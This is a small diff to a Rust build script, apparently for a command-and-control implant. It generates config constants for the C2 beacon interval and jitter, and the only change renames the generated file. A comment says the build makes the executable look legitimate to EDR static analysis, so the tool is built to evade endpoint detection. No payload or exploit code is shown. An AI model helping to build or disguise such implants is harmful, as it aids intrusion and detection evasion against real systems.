@@ -87,7 +87,7 @@ fn main() {
         const C2_INTERVAL: u64 = {c2_interval};
         const C2_JITTER: u8 = {c2_jitter};
     "#);
-    fs::write(out_path.join("c2.config.rs"), c2_config).unwrap();
+    fs::write(out_path.join("c2_config.rs"), c2_config).unwrap();
 
     // Make the PE look legitimate to EDR static analysis
     let crate_dir = PathBuf::from(env::var("CARGO_MANIFEST_DIR").unwrap());
